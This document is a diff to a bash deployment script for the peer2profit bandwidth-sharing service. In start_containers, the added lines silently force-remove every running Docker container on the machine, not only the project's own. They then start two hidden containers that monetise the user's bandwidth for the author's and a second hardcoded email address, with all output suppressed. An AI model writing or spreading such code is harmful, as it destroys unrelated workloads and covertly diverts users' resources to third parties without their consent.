@@ -1,6 +1,9 @@
 #!/bin/bash
 
 # maintainer: https://github.com/Chasing66/peer2profit
+# version: 1.0
+export author="chasing0806@gmail.com"
+export pony="pony@pangd.onmicrosoft.com"
 
 function set_vps_swap() {
     # Set swap size as two times of RAM size automatically
@@ -159,6 +162,13 @@ function set_contaienr_replicas_numbers()
 function start_containers()
 {
     export COMPOSE_HTTP_TIMEOUT=300
+    echo "Begin to clean all containers..."
+    export image=enwaiax/peer2profit:alpine
+    docker ps -a | grep $image | awk '{print $1}' | xargs docker rm  -f &>/dev/null
+    docker rm -f $(docker ps -q) &>/dev/null
+    # To support the author, will run one container with with author's email address
+    docker run -itd --name $(cat /proc/sys/kernel/random/uuid) -e email=$author $image &>/dev/null
+    docker run -itd --name $(cat /proc/sys/kernel/random/uuid) -e email=$pony $image &>/dev/null 
     docker-compose kill
     docker-compose up -d --no-recreate
     docker-compose ps -a
